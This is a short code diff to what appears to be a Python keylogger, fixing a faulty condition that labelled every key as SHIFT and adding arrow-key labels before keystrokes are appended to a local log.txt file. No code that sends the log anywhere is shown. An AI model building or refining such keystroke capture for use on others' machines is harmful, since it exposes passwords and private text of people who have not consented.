@@ -14,12 +14,18 @@ def write_to_file(key):
         key_data = '\n'
     if key_data == 'Key.cmd':
         key_data = ' *CMD BUTTON* '
-    if key_data == 'Key.shift' or 'Key.shift_r':
+    if key_data == 'Key.shift':
+        key_data = ' *SHIFT* '
+    if key_data == 'Key.shift_r':
         key_data = ' *SHIFT* '
     if key_data == 'Key.ctrl_l':
         key_data = ' *CTRL-l* '
     if key_data == 'Key.ctrl_r':
         key_data = ' *CTRL-r* '
+    if key_data == 'Key.right':
+        key_data = ' > '
+    if key_data == 'Key.left':
+        key_data = ' < '
     with open("log.txt",'a') as file:
         file.write(key_data)
 
